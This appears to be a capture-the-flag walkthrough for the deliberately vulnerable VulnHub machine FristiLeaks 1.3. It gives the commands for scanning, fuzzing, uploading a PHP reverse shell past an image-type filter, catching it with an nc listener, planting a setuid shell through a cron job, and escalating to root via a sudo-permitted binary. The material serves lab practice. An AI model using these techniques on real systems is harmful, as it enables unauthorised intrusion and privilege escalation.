
# FristiLeaks: 1.3 Walkthrough 

**VulnHub Link:** [FristiLeaks: 1.3](https://www.vulnhub.com/entry/fristileaks-13,133/)
**Difficulty:** Easy
**Release Date:** 14 Dec 2015

## 1.Reconnaissance
```bash
rustscan -a 10.20.1.158 --ulimit 5000
nmap -sV -A -O -T4 -sC 10.20.1.158 -p80
```

We see that only 80 port is open and We can start Web enumeration

## 2.Web Enumeration
```bash
ffuf -w /usr/share/wordlists/rockyou.txt -u http://10.20.1.158/FUZZ
```
We found out robots.txt but there are the same result 

But after waiting 5/6 minutes , Ffuf found fristi 

in source code , we found username eezeepz 

we found base64 encoded value 

When we decode , it seems that it is png formatted image

We trying base64 to image and found "kekkekkekkekkekkek" (kek 6 times)

And it is password and we logged in successfully 


## 3.Upload Bypass
Using BurpSuite , we are trying to upload php shell but it gives an error that you can only upload image formats

We trying some bypass methods , adding .png to the end of file name and here we go (CHANGE IP AND PORT ON SHELL PHP FILE BEFORE UPLOAD)

```bash
rlwrap nc -nvlp 1337
```
And we are in.!

## 4.Privilege Escalation(Horizontal)
We are apache user and reading passwd file

```bash
cat /etc/passwd
```

we found 3 home user (admin,fristgod,eezeepz) and one sudo user (fristi)

we found notes.txt on /home/eezeepz

 Yo EZ,


I made it possible for you to do some automated checks, 

but I did only allow you access to /usr/bin/* system binaries. I did

however copy a few extra often needed commands to my 

homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those

from /home/admin/


Don't forget to specify the full path for each binary!


Just put a file called "runthis" in /tmp/, each line one command. The 

output goes to the file "cronresult" in /tmp/. It should 

run every minute with my account privileges.


- Jerry 


```bash
echo "/home/admin/cat /bin/sh > /tmp/jerry" > /tmp/runthis
echo "/home/admin/chmod 4777 /tmp/jerry" >> /tmp/runthis
```

There are several ways to get admin shell.

after waiting one minute -->
```bash
/tmp/jerry -p
```

and boom , we are admin user 

and we see some files are encrpyted -->
with the help of Gemini we can decrypt them and found fristigod's password

```bash
python -c "import base64,codecs; print base64.b64decode(codecs.decode('[REDACTED]', 'rot13')[::-1])"
```

## 5.Privilege Escalation(Vertical)
```bash
sudo -l
sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash -p
whoami
```

And BOOM!! We are Root
